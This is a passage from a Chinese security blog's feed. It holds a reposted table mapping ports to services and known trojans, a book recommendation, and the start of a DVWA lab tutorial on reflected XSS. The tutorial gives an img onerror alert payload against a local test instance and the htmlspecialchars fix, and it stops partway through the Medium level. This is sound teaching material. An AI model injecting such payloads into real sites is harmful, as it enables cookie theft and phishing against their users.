id="端口：3333"><a href="#端口：3333" class="headerlink" title="端口：3333"></a>端口：3333</h3><p>服务：dec-notes<br>说明：木马Prosiak开放此端口</p><h3 id="端口：3389"><a href="#端口：3389" class="headerlink" title="端口：3389"></a>端口：3389</h3><p>服务：超级终端<br>说明：WINDOWS<br>2000终端开放此端口。</p><h3 id="端口：3700"><a href="#端口：3700" class="headerlink" title="端口：3700"></a>端口：3700</h3><p>服务：[NULL]<br>说明：木马Portal of<br>Doom开放此端口</p><h3 id="端口：3996、4060"><a href="#端口：3996、4060" class="headerlink" title="端口：3996、4060"></a>端口：3996、4060</h3><p>服务：[NULL]<br>说明：木马RemoteAnything开放此端口</p><h3 id="端口：4000"><a href="#端口：4000" class="headerlink" title="端口：4000"></a>端口：4000</h3><p>服务：QQ客户端<br>说明：腾讯QQ客户端开放此端口。</p><h3 id="端口：4092"><a href="#端口：4092" class="headerlink" title="端口：4092"></a>端口：4092</h3><p>服务：[NULL]<br>说明：木马WinCrash开放此端口。</p><h3 id="端口：4590"><a href="#端口：4590" class="headerlink" title="端口：4590"></a>端口：4590</h3><p>服务：[NULL]<br>说明：木马ICQTrojan开放此端口。</p><h3 id="端口：5000、5001、5321、50505"><a href="#端口：5000、5001、5321、50505" class="headerlink" title="端口：5000、5001、5321、50505"></a>端口：5000、5001、5321、50505</h3><p>服务：[NULL]<br>说明：木马blazer5开放5000端口。木马Sockets<br>de<br>Troie开放5000、5001、5321、50505端口。</p><h3 id="端口：5400、5401、5402"><a href="#端口：5400、5401、5402" class="headerlink" title="端口：5400、5401、5402"></a>端口：5400、5401、5402</h3><p>服务：[NULL]<br>说明：木马Blade<br>Runner开放此端口。</p><h3 id="端口：5550"><a href="#端口：5550" class="headerlink" title="端口：5550"></a>端口：5550</h3><p>服务：[NULL]<br>说明：木马xtcp开放此端口。</p><h3 id="端口：5569"><a href="#端口：5569" class="headerlink" title="端口：5569"></a>端口：5569</h3><p>服务：[NULL]<br>说明：木马Robo-Hack开放此端口。</p><h3 id="端口：5632"><a href="#端口：5632" class="headerlink" title="端口：5632"></a>端口：5632</h3><p>服务：pcAnywere<br>说明：有时会看到很多这个端口的扫描，这依赖于用户所在的位置。当用户打开pcAnywere时，它会自动扫描局域网C类网以寻找可能的代理（这里的代理是指agent而不是proxy）。入侵者也会寻找开放这种服务的计算机。，所以应该查看这种扫描的源地址。一些搜寻pcAnywere的扫描包常含端口22的UDP数据包。</p><h3 id="端口：5742"><a href="#端口：5742" class="headerlink" title="端口：5742"></a>端口：5742</h3><p>服务：[NULL]<br>说明：木马WinCrash1.03开放此端口。</p><h3 id="端口：6267"><a href="#端口：6267" class="headerlink" title="端口：6267"></a>端口：6267</h3><p>服务：[NULL]<br>说明：木马广外女生开放此端口。</p><h3 id="端口：6400"><a href="#端口：6400" class="headerlink" title="端口：6400"></a>端口：6400</h3><p>服务：[NULL]<br>说明：木马The<br>tHing开放此端口。</p><h3 id="端口：6670、6671"><a href="#端口：6670、6671" class="headerlink" title="端口：6670、6671"></a>端口：6670、6671</h3><p>服务：[NULL]<br>说明：木马Deep Throat开放6670端口。而Deep<br>Throat<br>3.0开放6671端口。</p><h3 id="端口：6883"><a href="#端口：6883" class="headerlink" title="端口：6883"></a>端口：6883</h3><p>服务：[NULL]<br>说明：木马DeltaSource开放此端口。</p><h3 id="端口：6969"><a href="#端口：6969" class="headerlink" title="端口：6969"></a>端口：6969</h3><p>服务：[NULL]<br>说明：木马Gatecrasher、Priority开放此端口。</p><h3 id="端口：6970"><a href="#端口：6970" class="headerlink" title="端口：6970"></a>端口：6970</h3><p>服务：RealAudio<br>说明：RealAudio客户将从服务器的6970-7170的UDP端口接收音频数据流。这是由TCP-7070端口外向控制连接设置的。</p><h3 id="端口：7000"><a href="#端口：7000" class="headerlink" title="端口：7000"></a>端口：7000</h3><p>服务：[NULL]<br>说明：木马Remote<br>Grab开放此端口。</p><h3 id="端口：7300、7301、7306、7307、7308"><a href="#端口：7300、7301、7306、7307、7308" class="headerlink" title="端口：7300、7301、7306、7307、7308"></a>端口：7300、7301、7306、7307、7308</h3><p>服务：[NULL]<br>说明：木马NetMonitor开放此端口。另外NetSpy1.0也开放7306端口。</p><h3 id="端口：7323"><a href="#端口：7323" class="headerlink" title="端口：7323"></a>端口：7323</h3><p>服务：[NULL]<br>说明：Sygate服务器端。</p><h3 id="端口：7626"><a href="#端口：7626" class="headerlink" title="端口：7626"></a>端口：7626</h3><p>服务：[NULL]<br>说明：木马Giscier开放此端口。</p><h3 id="端口：7789"><a href="#端口：7789" class="headerlink" title="端口：7789"></a>端口：7789</h3><p>服务：[NULL]<br>说明：木马ICKiller开放此端口。</p><h3 id="端口：8000"><a href="#端口：8000" class="headerlink" title="端口：8000"></a>端口：8000</h3><p>服务：OICQ<br>说明：腾讯QQ服务器端开放此端口。</p><h3 id="端口：8010"><a href="#端口：8010" class="headerlink" title="端口：8010"></a>端口：8010</h3><p>服务：Wingate<br>说明：Wingate代理开放此端口。</p><h3 id="端口：8080"><a href="#端口：8080" class="headerlink" title="端口：8080"></a>端口：8080</h3><p>服务：代理端口<br>说明：WWW代理开放此端口。</p><h3 id="端口：9400、9401、9402"><a href="#端口：9400、9401、9402" class="headerlink" title="端口：9400、9401、9402"></a>端口：9400、9401、9402</h3><p>服务：[NULL]<br>说明：木马Incommand<br>1.0开放此端口。</p><h3 id="端口：9872、9873、9874、9875、10067、10167"><a href="#端口：9872、9873、9874、9875、10067、10167" class="headerlink" title="端口：9872、9873、9874、9875、10067、10167"></a>端口：9872、9873、9874、9875、10067、10167</h3><p>服务：[NULL]<br>说明：木马Portal<br>of<br>Doom开放此端口。</p><h3 id="端口：9989"><a href="#端口：9989" class="headerlink" title="端口：9989"></a>端口：9989</h3><p>服务：[NULL]<br>说明：木马iNi-Killer开放此端口。</p><h3 id="端口：11000"><a href="#端口：11000" class="headerlink" title="端口：11000"></a>端口：11000</h3><p>服务：[NULL]<br>说明：木马SennaSpy开放此端口。</p><h3 id="端口：11223"><a href="#端口：11223" class="headerlink" title="端口：11223"></a>端口：11223</h3><p>服务：[NULL]<br>说明：木马Progenic<br>trojan开放此端口。</p><h3 id="端口：12076、61466"><a href="#端口：12076、61466" class="headerlink" title="端口：12076、61466"></a>端口：12076、61466</h3><p>服务：[NULL]<br>说明：木马Telecommando开放此端口。</p><h3 id="端口：12223"><a href="#端口：12223" class="headerlink" title="端口：12223"></a>端口：12223</h3><p>服务：[NULL]<br>说明：木马Hack’99<br>KeyLogger开放此端口。</p><h3 id="端口：12345、12346"><a href="#端口：12345、12346" class="headerlink" title="端口：12345、12346"></a>端口：12345、12346</h3><p>服务：[NULL]<br>说明：木马NetBus1.60/1.70、GabanBus开放此端口。</p><h3 id="端口：12361"><a href="#端口：12361" class="headerlink" title="端口：12361"></a>端口：12361</h3><p>服务：[NULL]<br>说明：木马Whack-a-mole开放此端口。</p><h3 id="端口：13223"><a href="#端口：13223" class="headerlink" title="端口：13223"></a>端口：13223</h3><p>服务：PowWow<br>说明：PowWow是Tribal<br>Voice的聊天程序。它允许用户在此端口打开私人聊天的连接。这一程序对于建立连接非常具有攻击性。它会驻扎在这个TCP端口等回应。造成类似心跳间隔的连接请求。如果一个拨号用户从另一个聊天者手中继承了IP地址就会发生好象有很多不同的人在测试这个端口的情况。这一协议使用OPNG作为其连接请求的前4个字节。</p><h3 id="端口：16969"><a href="#端口：16969" class="headerlink" title="端口：16969"></a>端口：16969</h3><p>服务：[NULL]<br>说明：木马Priority开放此端口。</p><h3 id="端口：17027"><a href="#端口：17027" class="headerlink" title="端口：17027"></a>端口：17027</h3><p>服务：Conducent<br>说明：这是一个外向连接。这是由于公司内部有人安装了带有Conducent”adbot”的共享软件。Conducent”adbot”是为共享软件显示广告服务的。使用这种服务的一种流行的软件是Pkware。</p><h3 id="端口：19191"><a href="#端口：19191" class="headerlink" title="端口：19191"></a>端口：19191</h3><p>服务：[NULL]<br>说明：木马蓝色火焰开放此端口。</p><h3 id="端口：20000、20001"><a href="#端口：20000、20001" class="headerlink" title="端口：20000、20001"></a>端口：20000、20001</h3><p>服务：[NULL]<br>说明：木马Millennium开放此端口。</p><h3 id="端口：20034"><a href="#端口：20034" class="headerlink" title="端口：20034"></a>端口：20034</h3><p>服务：[NULL]<br>说明：木马NetBus<br>Pro开放此端口。</p><h3 id="端口：21554"><a href="#端口：21554" class="headerlink" title="端口：21554"></a>端口：21554</h3><p>服务：[NULL]<br>说明：木马GirlFriend开放此端口。</p><h3 id="端口：22222"><a href="#端口：22222" class="headerlink" title="端口：22222"></a>端口：22222</h3><p>服务：[NULL]<br>说明：木马Prosiak开放此端口。</p><h3 id="端口：23456"><a href="#端口：23456" class="headerlink" title="端口：23456"></a>端口：23456</h3><p>服务：[NULL]<br>说明：木马Evil<br>FTP、Ugly<br>FTP开放此端口。</p><h3 id="端口：26274、47262"><a href="#端口：26274、47262" class="headerlink" title="端口：26274、47262"></a>端口：26274、47262</h3><p>服务：[NULL]<br>说明：木马Delta开放此端口。</p><h3 id="端口：27374"><a href="#端口：27374" class="headerlink" title="端口：27374"></a>端口：27374</h3><p>服务：[NULL]<br>说明：木马Subseven<br>2.1开放此端口。</p><h3 id="端口：30100"><a href="#端口：30100" class="headerlink" title="端口：30100"></a>端口：30100</h3><p>服务：[NULL]<br>说明：木马NetSphere开放此端口。</p><h3 id="端口：30303"><a href="#端口：30303" class="headerlink" title="端口：30303"></a>端口：30303</h3><p>服务：[NULL]<br>说明：木马Socket23开放此端口。</p><h3 id="端口：30999"><a href="#端口：30999" class="headerlink" title="端口：30999"></a>端口：30999</h3><p>服务：[NULL]<br>说明：木马Kuang开放此端口。</p><h3 id="端口：31337、31338"><a href="#端口：31337、31338" class="headerlink" title="端口：31337、31338"></a>端口：31337、31338</h3><p>服务：[NULL]<br>说明：木马BO(Back<br>Orifice)开放此端口。另外木马DeepBO也开放31338端口。</p><h3 id="端口：31339"><a href="#端口：31339" class="headerlink" title="端口：31339"></a>端口：31339</h3><p>服务：[NULL]<br>说明：木马NetSpy<br>DK开放此端口。</p><h3 id="端口：31666"><a href="#端口：31666" class="headerlink" title="端口：31666"></a>端口：31666</h3><p>服务：[NULL]<br>说明：木马BOWhack开放此端口。</p><h3 id="端口：33333"><a href="#端口：33333" class="headerlink" title="端口：33333"></a>端口：33333</h3><p>服务：[NULL]<br>说明：木马Prosiak开放此端口。</p><h3 id="端口：34324"><a href="#端口：34324" class="headerlink" title="端口：34324"></a>端口：34324</h3><p>服务：[NULL]<br>说明：木马Tiny<br>Telnet Server、BigGluck、TN开放此端口。</p><h3 id="端口：40412"><a href="#端口：40412" class="headerlink" title="端口：40412"></a>端口：40412</h3><p>服务：[NULL]<br>说明：木马The<br>Spy开放此端口。</p><h3 id="端口：40421、40422、40423、40426、"><a href="#端口：40421、40422、40423、40426、" class="headerlink" title="端口：40421、40422、40423、40426、"></a>端口：40421、40422、40423、40426、</h3><p>服务：[NULL]<br>说明：木马Masters<br>Paradise开放此端口。</p><h3 id="端口：43210、54321"><a href="#端口：43210、54321" class="headerlink" title="端口：43210、54321"></a>端口：43210、54321</h3><p>服务：[NULL]<br>说明：木马SchoolBus<br>1.0/2.0开放此端口。</p><h3 id="端口：44445"><a href="#端口：44445" class="headerlink" title="端口：44445"></a>端口：44445</h3><p>服务：[NULL]<br>说明：木马Happypig开放此端口。</p><h3 id="端口：50766"><a href="#端口：50766" class="headerlink" title="端口：50766"></a>端口：50766</h3><p>服务：[NULL]<br>说明：木马Fore开放此端口。</p><h3 id="端口：53001"><a href="#端口：53001" class="headerlink" title="端口：53001"></a>端口：53001</h3><p>服务：[NULL]<br>说明：木马Remote<br>Windows Shutdown开放此端口。</p><h3 id="端口：65000"><a href="#端口：65000" class="headerlink" title="端口：65000"></a>端口：65000</h3><p>服务：[NULL]<br>说明：木马Devil<br>1.03开放此端口。</p><h3 id="端口：88"><a href="#端口：88" class="headerlink" title="端口：88"></a>端口：88</h3><p>说明：Kerberos<br>krb5。另外TCP的88端口也是这个用途。</p><h3 id="端口：137"><a href="#端口：137" class="headerlink" title="端口：137"></a>端口：137</h3><p>说明：SQL Named Pipes encryption over other<br>protocols name lookup(其他协议名称查找上的SQL命名管道加密技术)和SQL RPC encryption over other<br>protocols name lookup(其他协议名称查找上的SQL RPC加密技术)和Wins NetBT name service(WINS<br>NetBT名称服务)和Wins Proxy都用这个端口。</p><h3 id="端口：161-1"><a href="#端口：161-1" class="headerlink" title="端口：161"></a>端口：161</h3><p>说明：Simple Network Management<br>Protocol(SMTP)（简单网络管理协议）。</p><h3 id="端口：162"><a href="#端口：162" class="headerlink" title="端口：162"></a>端口：162</h3><p>说明：SNMP<br>Trap（SNMP陷阱）</p><h3 id="端口：445"><a href="#端口：445" class="headerlink" title="端口：445"></a>端口：445</h3><p>说明：Common Internet File<br>System(CIFS)（公共Internet文件系统）</p><h3 id="端口：464"><a href="#端口：464" class="headerlink" title="端口：464"></a>端口：464</h3><p>说明：Kerberos<br>kpasswd(v5)。另外TCP的464端口也是这个用途。</p><h3 id="端口：500"><a href="#端口：500" class="headerlink" title="端口：500"></a>端口：500</h3><p>说明：Internet Key<br>Exchange(IKE)（Internet密钥交换）</p><h3 id="端口：1645、1812"><a href="#端口：1645、1812" class="headerlink" title="端口：1645、1812"></a>端口：1645、1812</h3><p>说明：Remot Authentication<br>Dial-In User Service(RADIUS)authentication(Routing and Remote<br>Access)(远程认证拨号用户服务)</p><h3 id="端口：1646、1813"><a href="#端口：1646、1813" class="headerlink" title="端口：1646、1813"></a>端口：1646、1813</h3><p>说明：RADIUS accounting(Routing and<br>Remote Access)(RADIUS记帐（路由和远程访问）)</p><h3 id="端口：1701"><a href="#端口：1701" class="headerlink" title="端口：1701"></a>端口：1701</h3><p>说明：Layer Two Tunneling<br>Protocol(L2TP)(第2层隧道协议)</p><h3 id="端口：1801、3527"><a href="#端口：1801、3527" class="headerlink" title="端口：1801、3527"></a>端口：1801、3527</h3><p>说明：Microsoft Message Queue<br>Server(Microsoft消息队列服务器)。还有TCP的135、1801、2101、2103、2105也是同样的用途。</p><h3 id="端口：2504"><a href="#端口：2504" class="headerlink" title="端口：2504"></a>端口：2504</h3><p>说明：Network<br>Load Balancing(网络平衡负荷)</p><p>网络层—数据包的包格式里面有个很重要的字段叫做协议号。比如在传输层如果是TCP连接，那么在网络层IP包里面的协议号就将会有个值是6，如果是UDP的话那个值就是17—传输层。<br>传输层—通过接口关联(端口的字段叫做端口)—应用层。<br>用netstat –an 可以查看本机开放的端口号。 </p><p>代理服务器常用端口</p><p>（1）. HTTP协议代理服务器常用端口号：80/8080/3128/8081/9080<br>（2）. SOCKS代理协议服务器常用端口号：1080<br>（3）. FTP（文件传输）协议代理服务器常用端口号：21<br>（4）. Telnet（远程登录）协议代理服务器常用端口：23<br>HTTP服务器，默认的端口号为80/tcp（木马Executor开放此端口）；<br>HTTPS（securely transferring web pages）服务器，默认的端口号为443/tcp 443/udp；<br>Telnet（不安全的文本传送），默认端口号为23/tcp（木马Tiny Telnet Server所开放的端口）；<br>FTP，默认的端口号为21/tcp（木马Doly Trojan、Fore、Invisible FTP、WebEx、WinCrash和Blade Runner所开放的端口）；<br>TFTP（Trivial File Transfer Protocol ），默认的端口号为69/udp；<br>SSH（安全登录）、SCP（文件传输）、端口重定向，默认的端口号为22/tcp；<br>SMTP Simple Mail Transfer Protocol (E-mail)，默认的端口号为25/tcp（木马Antigen、Email Password Sender、Haebu Coceda、Shtrilitz Stealth、WinPC、WinSpy都开放这个端口）；<br>POP3 Post Office Protocol (E-mail) ，默认的端口号为110/tcp；<br>WebLogic，默认的端口号为7001；<br>Webshpere应用程序，默认的端口号为9080；<br>webshpere管理工具，默认的端口号为9090；<br>JBOSS，默认的端口号为8080；<br>TOMCAT，默认的端口号为8080；<br>WIN2003远程登陆，默认的端口号为3389；<br>Symantec AV/Filter for MSE ,默认端口号为 8081；<br>Oracle 数据库，默认的端口号为1521；<br>ORACLE EMCTL，默认的端口号为1158；<br>Oracle XDB（ XML 数据库），默认的端口号为8080；<br>Oracle XDB FTP服务，默认的端口号为2100；<br>MS SQL<em>SERVER数据库server，默认的端口号为1433/tcp 1433/udp；<br>MS SQL</em>SERVER数据库monitor，默认的端口号为1434/tcp 1434/udp；<br>QQ，默认的端口号为1080/udp<br>TcpMux0 1 Tcp端口服务多路复用器<br>Echo 1 7 回送(echo回送所有的接收数据)<br>Discard2 9 删除(静态删除所有接受的数据)<br>Systat3 11 当前用户<br>Daytime 13 白天<br>Quotd 17 每天的引用<br>Chargen 19 产生字符<br>Ftp-data 20<br>文件传送(默认数据)<br>Ftp 21 文件传送(控制端口)<br>Telnet 23 远程通信网<br>Smtp 25 简单邮件传输协议<br>Time 37 时间<br>Nicname 43 谁<br>Domain 53 域名服务器<br>Bootps 67 引导程序协议服务器<br>Bootpc 68<br>引导程序协议客户<br>Tftp 69 普通文件传输协议<br>Gopher 70 Gopher<br>Finger 79 拨号<br>WWW-http 80 WWW-Http<br>Kerberos 88<br>Kerberos<br>Pop2 109 邮政协议版本2<br>Pop3 110 邮政协议版本3<br>Sunrpc 111 Sun运端程序呼叫<br>nntp 119 网络新闻传输协议<br>Ntp 123 网络时间协议<br>Netbios-ns 137 网络基本输入输出系统命名服务<br>Netbios-ns 138<br>网络基本输入输出系统数据报服务<br>Netbios-ssn 139 网络基本输入输出系统期间服务<br>Imap2 143<br>中间邮件访问协议V2<br>Snmp 161 简单网络管理协议<br>Bgp 179 边界网关协议<br>Syslog 514 系统登陆器</p><blockquote><p>转载至拼客学院</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 转载 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 端口 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[每周推荐]《以幽默的方式过一生》</title>
      <link href="/2019/01/10/mei-zhou-tui-jian-yi-you-mo-de-fang-shi-guo-yi-sheng/"/>
      <url>/2019/01/10/mei-zhou-tui-jian-yi-you-mo-de-fang-shi-guo-yi-sheng/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>《以幽默的方式过一生》是中信出版社在2017年6月出版的图书，作者是琢磨先生</p><h2 id="作者介绍"><a href="#作者介绍" class="headerlink" title="作者介绍"></a>作者介绍</h2><p>琢磨先生，原名郭城，财富管理专家，新锐经济学者，一位罕见的能将哲学、心理学和经济学融会贯通的人，被媒体评价为“人性的手术刀，又给人温暖向善的力量。”</p><p>财经第一媒体平台功夫财经的签约嘉宾，广东卫视《财经郎眼》脱口秀策划人，中山大学客座教授，剧场脱口秀演出策划人，在各地的脱口秀演出巡演一票难求。</p><p>出版著作《客户服务工具集》、《水煮西游记》和《培训师》。</p><h2 id="书籍目录"><a href="#书籍目录" class="headerlink" title="书籍目录"></a>书籍目录</h2><p>【立春】万物复苏，莺啼燕舞<br>人生中的选择<br>身为小姐不能有感觉了再接客<br>所有的伟大，都源于一个勇敢的开始<br>【雨水】鸿雁归来，草木萌动<br>生活就是心怀最大的善意在荆棘中穿行<br>你对了又怎样<br>机场遇到初恋女友<br>爱是个动词<br>【惊蛰】春雷惊蛰，杨绿风急<br>书架奇遇记<br>带书去旅行<br>阅读的快乐<br>【春分】黄赤相交，草长莺飞<br>我路过的城市和girls<br>我是个爱逛街的人<br>机场里的小旅行<br>【清明】春雨如丝，思念如凄<br>一转身，就是一辈子<br>世界的孤儿<br>凡是发生的必然发生<br>【谷雨】谷雨断霜，万物生长<br>找个能说话的人结婚<br>我老婆是这样驯化我的<br>我就不信管不了这个家<br>【立夏】万物并秀，各守其色<br>自己和别人的关系<br>朋友如三餐<br>有些事，不必说破<br>童真的故事<br>有什么好挤的<br>【小满】小满不满，本色内敛<br>爱情，并不是生命的全部<br>毛坯恋人<br>爱情里最容易犯贱<br>【芒种】适时播种，方期有成<br>任何情况下，提升自己最重要<br>职场的建议<br>接受不完美的自己<br>【夏至】梅雨纷飞，一夜生阴<br>理发师的手艺<br>衣橱里的秘密<br>当我开车的时候，我在想什么<br>跟楼上两口子斗争的七个夜晚<br>【小暑】温如小暑，杀气未素<br>三种男人的人生<br>四种女人的人生<br>其实你没必要活得那么紧张<br>【大暑】三伏叠出，何以解暑<br>社交时代的病人<br>聊天中的符号<br>微信头像和名字<br>【立秋】清风徐来，志在外也<br>孤独的力量<br>给自己藏点小幸福<br>天地间的第一个人<br>人性难断<br>【处暑】物极必反，处暑应寒<br>婚后遇到更喜欢的人<br>恋爱模式<br>心理学里如何定义爱情<br>【白露】阴气渐重，幽径多蹊<br>你那点事，有什么好说的<br>人性中最容易犯贱的地方<br>觉得别人晒，可能是自己缺<br>【秋分】秋风乍起，息声问道<br>秋天，我迷失于一片竹林<br>星座靠谱吗<br>算卦准不准<br>【寒露】寒气凝结，精灵出没<br>灵感捕手<br>嗑瓜子<br>人生第一次动手术<br>踮着脚尖得到的东西<br>【霜降】大地蒙霜，草木落黄<br>从青春年少路过<br>一个四十岁的男人给你提个醒<br>以幽默的方式过一生<br>【立冬】土气凝寒，万物收藏<br>你为什么赚不到钱<br>花钱的原则<br>借钱的艺术<br>【小雪】瑞雪丰年，吉象立现<br>生下来，还要会教育<br>有其父必有其子<br>【大雪】冰雪寒天，勿忘前川<br>出发太久，别忘记目的地<br>不是每个人的意见都值得倾听<br>每个不能打败我的事件，都会把我变得更加璀璨<br>【冬至】西北风袭，回笼教至<br>回笼教<br>大V</p><h2 id="经典段"><a href="#经典段" class="headerlink" title="经典段"></a>经典段</h2><p>这本书的写法是非常幽默，读起来非常通俗易懂并且符合社会逻辑。书中讲解了生活上、事业上、人际上、哲学上、爱情上等很多领域。</p><p>琢磨先生在第一篇“立春”就讲过<strong>人生的路归纳起来无非两条：一条用来实践，就是正在走的这条；一条用来遗憾，没事想想就好了。</strong>也阐述了这么个观点“人生总会因为没有选择那条路而遗憾，因为人生是无法穷尽所有选择的，但人生无需遗憾，因为注定发生的事情终究会发生，只要是自己选择的路就不要太在意结果，路途是荆棘还是风景，接受就好”</p><p>也提到了一个总有那么点的感觉，就是<strong>人生往往在不经意间，就会向另一个方向发展</strong>。</p><p>还说了<strong>有所得必有所失</strong>，比如我的职业是网络安全工程师，那么我接触的电脑久学习时间长，我技术会有所提升，陪伴身边人的时间就会少。如果陪伴身边人的时间说，接触电脑和学习时间就会比较短，但是这都是自己的选择，只要得之心所想，失之情所愿就行</p><p>琢磨先生认为：<br><strong>生活，就是心怀最大的善意在荆棘中穿行。<br>即使被刺伤，亦不改初衷。</strong></p><p>顺势而为，随遇而安。知错即改，迷途知返。</p><p>在喜欢自己的人身上用心，在不喜欢自己的人身上健忘。</p><blockquote><p>所以我觉得主要的就是尊重自己的选择，并要为自己的选择付出责任，即要为人生负责。</p></blockquote><p>琢磨先生还从身边发生的事情简单的阐述了，也就是“所有的伟大，都涌于一个勇敢的开始”，我觉得这句话非常的对，不管做哪件事情难的都是第一步，第一步决定了是否有关键的最后一步，<strong>所有很多事情，只要迈出第一步，就根本停不下来。但前提是，你得开始</strong>，所以很多人离优秀只差一个开始。</p><hr><p>琢磨先生说过：“<strong>一个坏朋友对你最大的打击，不是破坏了友谊，而是让你不再投入这份真诚。你的坏爱人对你最大的打击不是让你伤痕累累，而是让你再也不敢投入情感，挫败也好，伤害也好，总会成为过去，都会成为浮云。可怕的，是你用这些过去，绑架了自己的未来、</strong>”，同样的道理，不能因为一个人骗过你，而失去对所有人的信任。</p><hr><p>琢磨先生说过：“<strong>过日子，又不是审稿子，不涉及原则性的问题，你何苦要别人每个字都对？每句话都符合逻辑？每个段落都要照顾你的情绪？你只需要有时当作通假字，有时当作倒装句，有时当作比喻暗示，即可。在成人世界里，精确，是一件残忍的处世方式。糊涂，谁说不是一种高智商的生活态度。</strong>”，这句话我深有体会，下面我想说的是我个人的观点，我不知对与错，但在我的世界观里是觉得不妥的。记得在之前上课的时候，课堂氛围是死气沉沉的，但是我不喜欢这样，所以我经常会活泼并且滑稽的回答问题，这段时间很显然的提高的课堂效率，睡觉的同学少了，和我一起回答问题的人多了，但是当时老师是非常严厉的批评我的，他说我是在扰乱课堂，给我念’xxx守则’说我这是不对的，，，然后我就再也没有积极回答过问题，上课氛围依旧变得死气沉沉的，然而我并不觉得这个“对”是好的；我更认为的是解决问题大于纠结对错。</p><p><strong>成熟的定义是能互相理解对方</strong></p><hr><p>在爱情上，<strong>在谁身上开始，也需要在谁身上结束。</strong>不要谈着现任，心里还想着前任，否则你的爱情线不会幸福的。</p><p>要想爱情幸福还有一个很重要，爱要相互理解，关系、尊重和了解对方</p><hr><p><strong>其实不读书也没什么坏处，只是太过沉溺于现实世界，容易让人狗苟蝇营。比如，你可以通过读一本传记，窥见别人的人生。你可以读一本心理学的书，洞悉自我的处境。你可以读一本历史的书，看刀光剑影，明白再辉煌的生命也会尘埃落定。读书，让你在历史、未来、现实、空虚中来回穿梭，然后发现自己生活的更多可能。</strong></p><hr><blockquote><p>待续</p></blockquote><hr><p>这是个技术博客，也是个写作博客，因为我希望我的人生除了在事业上有所成就，还要知书达理。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 书籍推荐 </tag>
            
            <tag> 读后感 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dvwa-xss</title>
      <link href="/2019/01/06/dvwa-xss/"/>
      <url>/2019/01/06/dvwa-xss/</url>
      
        <content type="html"><![CDATA[<p>Dvwa是一个网站渗透测试演练平台，里面包括了Xss攻击,Sql注入攻击，Csrf漏洞、文件上传漏洞、命令注入漏洞等，而且每个漏洞都分为<code>Low(低等级)、Medium( 中等级 )、High( 高等级 )、Impossible( 没漏洞等级 )</code></p><p>下载过程和安装过程网上可以找到我就不讲解了。</p><p>首先将<code>Dvwa</code>等级设置成<code>Low</code>:</p><p><img src="http://static.zybuluo.com/1kbfree/xhlnfqib3ib7m5jpq5s0k9us/image_1ce8m63q6g1s5ab1ef51ilf92m9.png" alt="image_1ce8m63q6g1s5ab1ef51ilf92m9.png-135.5kB"></p><hr><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><h3 id="Xss反射型："><a href="#Xss反射型：" class="headerlink" title="Xss反射型："></a>Xss反射型：</h3><p><img src="http://static.zybuluo.com/1kbfree/bzktsumqyk5cl12z0z15nojx/image_1ce8mao1la4233k77t19h21v82m.png" alt="image_1ce8mao1la4233k77t19h21v82m.png-203.8kB"><br><em>当输入<code>hello</code>在输入框点击Submit后，会输出一个<code>Hello iamfree</code>，那么我们来看看这是如何实现的</em></p><h4 id="实现的代码："><a href="#实现的代码：" class="headerlink" title="实现的代码："></a>实现的代码：</h4><p><img src="http://static.zybuluo.com/1kbfree/28z6tmahfg6x1z7reai804j1/image_1ce8n2a0ijtjgs8iitt4a1ou09.png" alt="image_1ce8n2a0ijtjgs8iitt4a1ou09.png-147.4kB"><br><em>因为这是<code>Low</code>级别的，所以我们可以清楚的看见这里没有做任何过滤，我们只需要输入一串而已的Js代码就可以实现盗取别人Cookie，做钓鱼之类的功能，下面我来简单的演示一下~</em></p><p>输入<code>&lt;img src=x onerror=alert(&#39;iamfree&#39;)&gt;</code>后，Url变成<code>http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx+onerror%3Dalert%28%27iamfree%27%29%3E#</code>，效果:<br><img src="http://static.zybuluo.com/1kbfree/hl67ru1a4l4ltyvhi82dj0bw/image_1ce8naell1jlrkv6s1214dh7n7m.png" alt="image_1ce8naell1jlrkv6s1214dh7n7m.png-130.1kB"></p><p><code>&lt;img src=x onerror=alert(&#39;iamfree&#39;)&gt;</code>的src表示img图片的地址，可以是本地也可以是Url形式;onerror的意思是如果图片没有正常显示的话就会执行<code>=</code>后面的代码，因为这里<code>src=x</code>而<code>x</code>是不存在的，所以无法显示，就会报错了~</p><h3 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h3><p><strong>这里的话防御很简单的，只需要一个函数即可：</strong><br><img src="http://static.zybuluo.com/1kbfree/n875b1a8nh9rciqc7w66vxku/image_1ce8nikp01hm91qse12112ra2802p.png" alt="image_1ce8nikp01hm91qse12112ra2802p.png-53.3kB"></p><p><strong>继续访问刚才的Url(<code>http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx+onerror%3Dalert%28%27iamfree%27%29%3E#</code>)，看看是否有效:</strong><br><img src="http://static.zybuluo.com/1kbfree/3y12i2skpud63a1qgec93sxz/image_1ce8nph771gbkh9n1v6q16p41ho736.png" alt="image_1ce8nph771gbkh9n1v6q16p41ho736.png-175.7kB"><br><em>成功的防止了Xss反射型攻击了~</em></p><h3 id="htmlspecialchars函数的官方解释"><a href="#htmlspecialchars函数的官方解释" class="headerlink" title="htmlspecialchars函数的官方解释:"></a>htmlspecialchars函数的官方解释:</h3><p><img src="http://static.zybuluo.com/1kbfree/piy4p2lkq0h81v0d1u4y5mb7/image_1ce8nug1jgbj1iib1hl91ii51vic3j.png" alt="image_1ce8nug1jgbj1iib1hl91ii51vic3j.png-137.1kB"></p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><h3 id="查看Medium源代码"><a href="#查看Medium源代码" class="headerlink" title="查看Medium源代码:"></a>查看<code>Medium</code>源代码:</h3><p><img src="http://static.zybuluo.com/1kbfree/lcvg5jbwdqdbmyxlai363f9l/image_1ceaj53i93ri2t12be93ndtqp.png" alt="image_1ceaj53i93ri2t12be93ndtqp.png-140.1kB"></p><p><strong>点开后是这样的：</strong><br><img src="http://static.zybuluo.com/1kbfree/bb6yzgt81wtl2guv6u9yus7l/image_1ceaj6a2b9ti1o1ee8s1dh31p5v16.png" 